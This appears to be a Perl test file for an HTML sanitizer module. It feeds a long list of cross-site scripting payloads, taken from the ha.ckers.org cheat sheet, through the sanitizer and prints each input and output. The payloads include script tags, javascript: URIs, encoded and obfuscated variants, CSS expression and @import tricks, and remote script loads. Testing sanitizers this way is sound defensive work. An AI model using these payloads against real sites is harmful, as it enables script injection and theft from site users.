#!/usr/bin/env perl
use warnings;
use strict;
use Test::More;

BEGIN { use_ok("SanitizerX") }

ok( defined &sanitize_html, "sanitize_html is exported" );

local $/ = "\n_RS_\n";
while ( my $in = <DATA> )
{
    chomp $in;
    my $out = sanitize_html(\$in);
    diag(sprintf("BEFORE: $in\n----------\nAFTER: $out\n",
                 $in,
                 $out)
        );
    diag "\n================================\n\n";
}

done_testing();

exit 0;

__DATA__
Downloaded from ha.ckers.org 20220315. Beware! What's the matter? Don't you get it?
_RS_
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
_RS_
'';!--"<XSS>=&{()}
_RS_
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
_RS_
<IMG SRC="javascript:alert('XSS');">
_RS_
<IMG SRC=javascript:alert('XSS')>
_RS_
<IMG SRC=JaVaScRiPt:alert('XSS')>
_RS_
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
_RS_
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
_RS_
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
_RS_
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
_RS_
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
_RS_
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
_RS_
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
_RS_
<IMG SRC="jav	ascript:alert('XSS');">
_RS_
<IMG SRC="jav&#x09;ascript:alert('XSS');">
_RS_
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
_RS_
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
_RS_
<IMGSRC="javascript:alert('XSS')">
_RS_
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
_RS_
perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
_RS_
<IMG SRC=" &#14;  javascript:alert('XSS');">
_RS_
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
_RS_
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<<SCRIPT>alert("XSS");//<</SCRIPT>
_RS_
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
_RS_
<SCRIPT SRC=//ha.ckers.org/.j>
_RS_
<IMG SRC="javascript:alert('XSS')"
_RS_
<iframe src=http://ha.ckers.org/scriptlet.html <
_RS_
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
_RS_
\";alert('XSS');//
_RS_
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
_RS_
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
_RS_
<BODY BACKGROUND="javascript:alert('XSS')"></BODY>
_RS_
<BODY ONLOAD=alert('XSS')>
_RS_
<IMG DYNSRC="javascript:alert('XSS')">
_RS_
<IMG LOWSRC="javascript:alert('XSS')">
_RS_
<BGSOUND SRC="javascript:alert('XSS');">
_RS_
<BR SIZE="&{alert('XSS')}">
_RS_
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
_RS_
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
_RS_
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
_RS_
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
_RS_
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
_RS_
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
_RS_
<XSS STYLE="behavior: url(xss.htc);">
_RS_
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
_RS_
<IMG SRC='vbscript:msgbox("XSS")'>
_RS_
<IMG SRC="mocha:[code]">
_RS_
<IMG SRC="livescript:[code]">
_RS_
¼script¾alert(¢XSS¢)¼/script¾
_RS_
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
_RS_
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
_RS_
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
_RS_
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
_RS_
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
_RS_
<TABLE BACKGROUND="javascript:alert('XSS')">
_RS_
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
_RS_
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
_RS_
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
_RS_
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
_RS_
<DIV STYLE="width: expression(alert('XSS'));">
_RS_
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
_RS_
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
_RS_
<XSS STYLE="xss:expression(alert('XSS'))">
_RS_
exp/*<A STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
_RS_
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
_RS_
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
_RS_
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
_RS_
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
_RS_
<BASE HREF="javascript:alert('XSS');//">
_RS_
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
_RS_
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
_RS_
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
_RS_
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
_RS_
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);
_RS_
<HTML xmlns:xss>
  <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
  <xss:xss>XSS</xss:xss>
</HTML>
_RS_
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
_RS_
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
_RS_
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
_RS_
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
</BODY></HTML>
_RS_
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
_RS_
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
_RS_
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
_RS_
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
_RS_
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
_RS_
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
_RS_
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
_RS_
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<A HREF="http://66.102.7.147/">XSS</A>
_RS_
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
_RS_
<A HREF="http://1113982867/">XSS</A>
_RS_
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
_RS_
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
_RS_
<A HREF="h
tt	p://6&#9;6.000146.0x7.147/">XSS</A>
_RS_
<A HREF="//www.google.com/">XSS</A>
_RS_
<A HREF="//google">XSS</A>
_RS_
<A HREF="http://ha.ckers.org@google">XSS</A>
_RS_
<A HREF="http://google:ha.ckers.org">XSS</A>
_RS_
<A HREF="http://google.com/">XSS</A>
_RS_
<A HREF="http://www.google.com./">XSS</A>
_RS_
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
_RS_
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
_RS_
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
_RS_
<style type="text/css">
   @import url("screen.css");
</style>
_RS_
<div type="text/css">
   @import url("screen.css");
</div>
_RS_
<span style="@import url("style.css");">++++++++++++Yes</span>
2<span style="@import url(style.css);">++++++++++++Yes </span>
3<span style="@import "style.css";">+++-++++++++Yes </span>
4<span style="@import url("style.css") all;">----++++++++Yes </span>
5<span style="@import url("&#115;">tyle.css");">----+-+++---Yes </span>
6&#64;">import url("style.css");">----+-+++---Yes </span>
7<span style="@import url("style.%63ss");">++++++++++++Yes </span>
8<span style="@import/**/"style.css";">++--+++++++-Yes </span>
9<span style="@import "style.css"/**/;">+---+++++++-Yes </span>
10<span style="@import url(/**/"style.css");">+-----+++---Yes </span>
11<span style="@imp\6F rt url("style.css");">+-----+++--+YesWarning</span>
12<span style="@import\**\"style.css";">-+----------YesWarning</span>
13<span style="@im\port url("style.css");">+-----+++--+YesWarning</span>
14<span style="@import\ url("style.css");">-+++--------YesWarning</span>
15<span style="@import_url("style.css");">--++-------+YesWarning</span>
16<span style="@import "style.css";"></span>
Non-Breaking Space (Alt-0160) after <span style="@import-++---------YesWarning</span>
17 <span style="@import "style.css";"></span>
Non-Breaking Space (Alt-0160) before <span style="@import+++---------NoError</span>
18<span style="@import "style.css" ;"></span>
Non-Breaking Space (Alt-0160) before ;">+++---------NoError</span>
19<span style="@import url ("style.css");"></span>
Non-Breaking Space (Alt-0160) after url-+----------NoError</span>
20<span style="@import: url("style.css");">++++--- -   NoError</span>
21<span style="@ import url("style.css");">-+----------NoError</span>
22<span style="@import url ("style.css");">++----------NoError</span>
23<span style="@import style.css;">+++---------NoError</span>
24_<span style="@import "style.css";">--+---------NoError</span>
25<span style="@import url("style.css")_;">-------++---NoError</span>
26em{color:red};"><span style="@import url("style.css");">-+++--------NoError</span>
27\<span style="@import url("style.css");">--++--------NoError</span>
28<span style="@import url\ ("style.css");">+-----------NoError</span>
29<span style="@import ur\6C ("style.css");">+-----+++--+NoError</span>
30<span style="@import(style.css);">---------- +NoError</span>
31<span style="@import url("style.\63 ss");">+---++++++++NoError</span>
[Bad Request]</span>
32<span style="@import url("style. </span>
css");">++++--------NoError</span>
33<span style="@import url("style.\css");">
</span>
_RS_
<p style="text-align:center;background:url(/asdf)">o hai</p>
